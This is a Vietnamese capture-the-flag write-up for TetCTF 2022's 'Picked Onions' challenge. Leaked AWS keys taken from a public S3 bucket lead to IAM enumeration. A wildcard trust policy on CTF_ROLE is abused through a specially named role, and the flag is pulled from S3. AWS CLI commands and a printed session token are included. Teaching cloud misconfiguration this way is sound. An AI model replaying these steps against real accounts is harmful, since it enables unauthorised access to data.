## :rocket: Picked Onions

> Cloud challenge đầu tiên mà mình từng chơi. BTC nói TetCTF 2022 sẽ có modern web challenge, và bài này chứng minh BTC đã cực kì uy tín :D Trân trọng cảm ơn author của bài này là anh Chi Tran ([@0xfatty](https://twitter.com/0xfatty)) đã cho mình mượn acc AWS để giải được bài này!

![image](https://user-images.githubusercontent.com/61876488/147883502-c9eaa3a9-5b52-4814-bdc4-d7b68018829f.png)

[+] [Source]()

### 1. Initial reconnaissance:

![](https://i.imgur.com/KZkap6X.png)

- Website này chức năng nhìn sơ qua không có gì mấy ngoài quả meme huyền thoại kia. Nhưng có cái chức năng `/secret` khiến mình tò mò:

![](https://i.imgur.com/UzRL9qA.png)

- Một quả ảnh có tính clickbait cực mạnh khiến rất nhiều "con giời" download về rồi tìm cách steganography analysis cái ảnh này xem bên trong nó có flag hay không ????? :D. Nhưng mà ôi bạn ơi, challenge này thuộc category là web chứ có phải forensic đâu? Như tác giả bài này đã nói:

![](https://i.imgur.com/Z9M0T9X.png)

- Vậy thì "secret" đằng sau bức ảnh này là gì? Bài học đầu đời khi chơi mảng web, đó là chúng ta cần phải biết CTRL + U:

![](https://i.imgur.com/OhsM4WX.png)

- Các website hiện nay thường lưu trữ các static file như image trên CDN (content delivery network), và cái trang này cũng không phải ngoại lệ. Nhờ CTRL+U ta biết được ảnh trên được lưu trữ trên một S3 Bucket. Chúng ta có thể xem bên trong Bucket này có gì vui với URL https://secret-tetctf.s3.us-east-1.amazonaws.com/:

![](https://i.imgur.com/fUwZ9lI.png)

- Cho ai muốn tìm hiểu kĩ về cái file XML này thì có xem tại [đây](https://docs.aws.amazon.com/AmazonS3/latest/API/API_ListObjects.html). Hiểu nôm na thì đây là list tất cả các resource của web được chứa trên Bucket này. Bên cạnh cái ảnh `I've_Got_a_Secret.jpg` mà chúng ta thấy lúc nãy, còn có `secret`. Thử access vào `secret` thì ta lấy được file `scret` về:

![](https://i.imgur.com/nl5YmyJ.png)

- Đây là một file python. Ngoài việc cho chúng ta biết web app này xài Flask và render static file của một số trang linh tinh, thì có chỗ này trông có vẻ khá "mlem":

```python=
dynamodb = boto3.resource('dynamodb', region_name='us-east-1',aws_access_key_id='A*******************',aws_secret_access_key='*DQnIi0Mhtsa*/*********************4S1Z0',region_name="us-east-1")
```

- `aws_access_key_id` và `aws_secret_access_key` đã bị leak (đã che vì lí do bảo mật)!!! Thử dùng [AWS CLI](https://docs.aws.amazon.com/cli/latest/userguide/cli-chap-getting-started.html) và config các ecurity credentials của nó với `aws_access_key_id` và `aws_secret_access_key` bị leak xem sao:

![](https://i.imgur.com/zQtvRFp.png)

- Sau đó làm một vài trò "con bò" với service dynamodb của Bucket này như `aws dynamodb list-tables` để rồi chỉ thấy có mỗi table `customers`, sau đó `aws dynamodb scan --table-name customers` để xem trong table `customers` có gì hay thì quả nhiên không có gì thật :D. Nếu mà giấu flag trong này luôn thì game dễ quá! Mình còn thử tạo một class có chứa payload reverse shell, serialize và ném lên DynamoDB để nó insert reverse shell vào table "customers" với hàm [put_item](https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/dynamodb.html#DynamoDB.Client.put_item) (vì đề bài là picked onions, web app lại xài [pickle](https://docs.python.org/3/library/pickle.html) làm mình liên tưởng đến lỗ hổng [pickle deserialization](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)). Nhưng mà như thế thì cũng lại dễ quá!

![](https://i.imgur.com/TQpPjg9.png)

`aws_access_key_id` mà chúng ta đang dùng có role là `dbb_user`, role này không được cấp quyền để put item lên.    Trong lúc đang bí bách thì thằng teammate của mình [@baolongv3](https://github.com/baolongv3) đã dump ra được toàn bộ các role từ service IAM (AWS Identity and Access Management) của Bucket với lệnh `aws iam list-roles` (đọc về IAM tại [đây](https://viblo.asia/p/aws-iam-identity-and-access-management-la-gi-1Je5EXz4lnL)):

![](https://i.imgur.com/aWKN08A.png)

- Uầy, có hẳn `CTF Role` luôn! Thêm quả `...Accessing_Tet_CTF_Flag*` ở `Condition` thế kia thì chắc kèo đây là một role được tác giả config chỉ dành riêng cho việc đọc flag rồi. Để ý trong đoạn [IAM JSON policy elements reference](https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_elements.html) mô tả về `CTF Role` có đoạn:

```json=
"Principal": {
                            "AWS": "*"
                        },
                        "Action": "sts:AssumeRole",
                        "Condition": {
                            "StringLike": {
                                "aws:PrincipalArn": "arn:aws:iam::*:role/*-Accessing_Tet_CTF_Flag*"
                            }
                        }
...
}
```

- Đoạn JSON này cho chúng ta biết rằng bất cứ AWS account nào với role có [ARN](https://docs.aws.amazon.com/general/latest/gr/aws-arns-and-namespaces.html) có dạng `arn:aws:iam::*:role/*-Accessing_Tet_CTF_Flag*`, trong đó dầu `*` có nghĩa là "viết cái gì vào cũng được", đều có thể assume vào `CTF Role` này. Ví dụ chúng ta tạo 1 role có tên là `antoine-Accessing_Tet_CTF_Flag_101`, sau đó ARN được tạo ra của nó sẽ là `arn:aws:iam::<iam's id>:role/antoine-Accessing_Tet_CTF_Flag_101` thì nó có thể assume được `CTF Role`. 

- Vấn đề bây giờ là chúng ta cần tạo một IAM user. Như các bạn có thể thấy trong [video hướng dẫn setup IAM user](https://www.youtube.com/watch?v=wRzzBb18qUw&t=38s&ab_channel=AmazonWebServices), chúng ta cần có một account AWS, lúc register lại cần phải add thẻ visa, mà mình thì không có thẻ huhu =(((. Đang định chửi đây là vì visa challenge vì chạy ngược chạy xuôi vẫn không ai có acc AWS mà mượn thì có anh tác giả bài này là anh [@0xfatty](https://twitter.com/0xfatty) tốt bụng tạo giúp một cái IAM user cho mình chơi luôn :D


![](https://i.imgur.com/u7lMmLl.png)


### 2. Exploit AWS S3 Bucket Access Control Misconfiguration:

- Giờ mình sẽ dùng key id và secret key của `test_user` mà anh [@0xfatty](https://twitter.com/0xfatty) đưa cho thay vì `ddb_user`. Trong `test_user` mình sẽ tạo một role có ARN thỏa mãn điều kiện của CTF Role để có thể assume vào như í dụ lúc nãy, bắt đầu với việc viết [AssumeRolePolicyDocument](https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-iam-role.html): 

```json=
{
    "Version": "2012-10-17",
    "Statement": [
      {
        "Effect": "Allow",
        "Principal": {
          "AWS": "*" 
        },
        "Action": "sts:AssumeRole",
        "Condition": {}
      }
    ]
  }
```

- Sau đó tạo một role với tên là `antoine-Accessing_Tet_CTF_Flag_101` và add file `test-policy.json` (AssumeRolePolicyDocument) trên kia vào:

```bash=
C:\Users\antoinenguyen\OneDrive\Documents\CTF\TetCTF2022\pickle onions>aws iam create-role --role-name antoine-Accessing_Tet_CTF_Flag_101 --assume-role-policy-document file://test-policy.json
{
    "Role": {
        "Path": "/",
        "RoleName": "antoine-Accessing_Tet_CTF_Flag_101",
        "RoleId": "ARXXXXXXXXXXXXXXXXXXX",
        "Arn": "arn:aws:iam::50XXXXXXXXXX:role/antoine-Accessing_Tet_CTF_Flag_101",
        "CreateDate": "2022-01-03T10:37:12+00:00",
        "AssumeRolePolicyDocument": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Principal": {
                        "AWS": "*"
                    },
                    "Action": "sts:AssumeRole",
                    "Condition": {}
                }
            ]
        }
    }
}
```

- Assume vào role vừa mới tạo, `AccessKeyId`, `SecretAccessKey` và `SessionToken` sẽ được sinh ra. Tạo các enviroment variables như `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY` và `AWS_SESSION_TOKEN` tương ứng với 3 cái vừa output ra:

![](https://i.imgur.com/8JHz66f.png)

- Với role `antoine-Accessing_Tet_CTF_Flag_101` với mới assume vào thì chúng ta đã đủ điều kiện để asume tiếp vào `CTF Role`. Assume được vào `CTF Role` thì tiếp tục làm tương tự như sau khi vào `antoine-Accessing_Tet_CTF_Flag_101`:

```bash=
C:\Users\antoinenguyen\OneDrive\Documents\CTF\TetCTF2022\pickle onions>aws sts assume-role --role-arn "arn:aws:iam::509530203012:role/CTF_ROLE" --role-session-name antoinerolesession1
{
    "Credentials": {
        "AccessKeyId": "AXXXXXXXXXXXXXXXXXX",
        "SecretAccessKey": "Q5di89p/fXXXXXXXXXXXXXXXXXXXXXXXXXXXXX/",
        "SessionToken": "IQoJb3JpZ2luX2VjEFMaCXVzLWVhc3QtMSJHMEUCIF666+UdD/zto6xA2YYxgo/UaKArvy22EDZjZ/JBLQlfAiEAgyCTIjz7WFwYKvkU/EsZxMUtGGU+lQaJp9NaOtMeS68qoAIIXBAAGgw1MDk1MzAyMDMwMTIiDAv8Jom3IWmxzlvp0Cr9AaWM2E1u4newbw1q0KFVKBmibwD+4WkuWiuYzc4JOMt+IAzk3c9/UlvCdV561XI1tyGsyKfy1b3G/nlVrttnuxChD1scfZ+6ArEmSBcCOtp5LjyhAT38eiD7ZVua2jIcBF8XePjTgbhOG556Zmwln5IhFuaBgcl0Zk79NHKY9gWgUFDZhQSIRBd+io3w/QogmbChW1tts/LHORtN53fDNdtyb8SK04+oldYHQDyzo4kmxLxAZLkWj2HHzRBiVdwx/kDcL4xzh3P8dwU4u4uoXe6BRpONIIYWrCcceDuGf5zG0IxHzeQgpXXSPSHBg30CXYftH/H7b80YL3N54nYw4KrLjgY6nQFDd4rPpPjdZwldVrGRBJ73VcK+akqcAP3qgRNAiFPQN9qnUs5vdqm/3P10DKFMbe/ZlWuvYhw3l/tnYLgAOxxxtV7RbyQoE/R9TfQuDDwM2yMTiTBcPmd/LTONF5nI/1u5cGvdeXt6fBmK15vAo1mo9FpkxtOoB4LTWCkOi1WxG1Xows+AqSYIcfZQQAbApjFn0Ympl+pennZeSdCW",
        "Expiration": "2022-01-03T11:52:16+00:00"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AXXXXXXXXXXXXXXXXXXXX:antoinerolesession1",
        "Arn": "arn:aws:sts::5XXXXXXXXXXX:assumed-role/CTF_ROLE/antoinerolesession1"
    }
}
 
C:\Users\antoinenguyen\OneDrive\Documents\CTF\TetCTF2022\pickle onions>SET AWS_ACCESS_KEY_ID=<AccessKeyId>

C:\Users\antoinenguyen\OneDrive\Documents\CTF\TetCTF2022\pickle onions>SET AWS_SECRET_ACCESS_KEY=<SecretAccessKey>

C:\Users\antoinenguyen\OneDrive\Documents\CTF\TetCTF2022\pickle onions>SET AWS_SESSION_TOKEN=<SessionToken>
```

- Confirm lại IAM user đã nhận được `CTF Role` chưa cho chắc :v::

```bash=
C:\Users\antoinenguyen\OneDrive\Documents\CTF\TetCTF2022\pickle onions>aws sts get-caller-identity
{
    "UserId": "AXXXXXXXXXXXXXXXXXXXX:antoinerolesession1",
    "Account": "509530203012",
    "Arn": "arn:aws:sts::5XXXXXXXXXXX:assumed-role/CTF_ROLE/antoinerolesession1"
}

```
- Cuối cùng thì chúng ta đã có thể thoải mái "đi lượn" trong Bucket của web app này và lấy flag :v: :

```bash=
C:\Users\antoinenguyen\OneDrive\Documents\CTF\TetCTF2022\pickle onions>aws s3api list-buckets --query "Buckets[].Name"
[
    "secret-tetctf",
    "tet-ctf-secret"
]

C:\Users\antoinenguyen\OneDrive\Documents\CTF\TetCTF2022\pickle onions>aws s3 ls s3://tet-ctf-secret
2021-12-29 22:18:42         29 flag

C:\Users\antoinenguyen\OneDrive\Documents\CTF\TetCTF2022\pickle onions>aws s3 cp s3://tet-ctf-secret/flag flag.txt
download: s3://tet-ctf-secret/flag to .\flag.txt
```

- Flag đã được down về current directory, chỉ việc lấy ra và submit nữa thôi:

	`TetCTF{AssumE_R0le-iS-A-MuSt}`
